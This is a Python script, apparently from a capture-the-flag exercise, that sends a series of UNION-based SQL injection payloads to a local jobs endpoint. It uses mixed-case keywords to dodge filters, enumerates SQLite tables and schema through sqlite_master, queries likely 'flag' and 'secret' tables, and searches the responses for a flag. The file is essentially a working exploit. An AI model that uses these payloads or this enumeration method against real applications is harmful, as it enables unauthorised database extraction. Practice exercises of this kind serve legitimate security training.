import subprocess
import json
import sys

def send_payload(payload):
    """Send SQL injection payload and return response"""
    json_data = json.dumps({"job_type": payload})
    
    cmd = [
        "curl", "-s", "-X", "POST",
        "-H", "Content-Type: application/json",
        "-d", json_data,
        "http://127.0.0.1:8000/jobs"
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), 1

# Extract database information and flag
payloads = [
    # 1. Get all table names from sqlite_master
    {
        "desc": "Extract all table names",
        "payload": "back-end' uNiOn SeLeCt 1,group_concat(name),3,4 FrOm sqlite_master WhErE type='table'--"
    },
    # 2. Get schema of sqlite_master (to see structure)
    {
        "desc": "Extract sqlite_master schema",
        "payload": "back-end' uNiOn SeLeCt 1,sql,3,4 FrOm sqlite_master WhErE type='table'--"
    },
    # 3. Check for flag table (common names)
    {
        "desc": "Query flag table if exists",
        "payload": "back-end' uNiOn SeLeCt 1,flag,3,4 FrOm flag--"
    },
    # 4. Check for flags table
    {
        "desc": "Query flags table",
        "payload": "back-end' uNiOn SeLeCt 1,flag,3,4 FrOm flags--"
    },
    # 5. Check for secret table
    {
        "desc": "Query secret table",
        "payload": "back-end' uNiOn SeLeCt 1,secret,3,4 FrOm secret--"
    },
    # 6. Check any table that might contain flag - get all data
    {
        "desc": "Get all columns from sqlite_master",
        "payload": "back-end' uNiOn SeLeCt 1,group_concat(tbl_name),3,4 FrOm sqlite_temp_master--"
    },
    # 7. Query jobs table to see all data
    {
        "desc": "Query jobs table for hidden flags",
        "payload": "back-end' uNiOn SeLeCt 1,group_concat(description),3,4 FrOm jobs--"
    },
]

print("="*80)
print("EXTRACTING DATABASE STRUCTURE AND FLAG")
print("="*80)

for i, test in enumerate(payloads, 1):
    print(f"\n[{i}] {test['desc']}")
    print(f"Payload: {test['payload']}")
    print("-" * 80)
    
    stdout, stderr, returncode = send_payload(test['payload'])
    
    if stdout and stdout.strip().startswith('['):
        print("[+] SUCCESS! Response:")
        try:
            data = json.loads(stdout)
            print(json.dumps(data, indent=2))
            
            # Check for flags in any field
            for row in data:
                for key, value in row.items():
                    if value and ("flag" in str(value).lower() or "FLAG{" in str(value)):
                        print(f"\n🚩🚩🚩 FLAG DISCOVERED: {value} 🚩🚩🚩")
                        sys.exit(0)  # Exit on flag found
        except Exception as e:
            print(f"Error parsing JSON: {e}")
            print(stdout[:500])
    elif "Internal Server Error" in stdout:
        print("[-] Internal Server Error")
    else:
        print("Response:", stdout[:400] if stdout else "No response")

    if stderr:
        print("Error:", stderr[:200])

print("\n" + "="*80)
print("Flag extraction completed")
print("="*80)
EOF

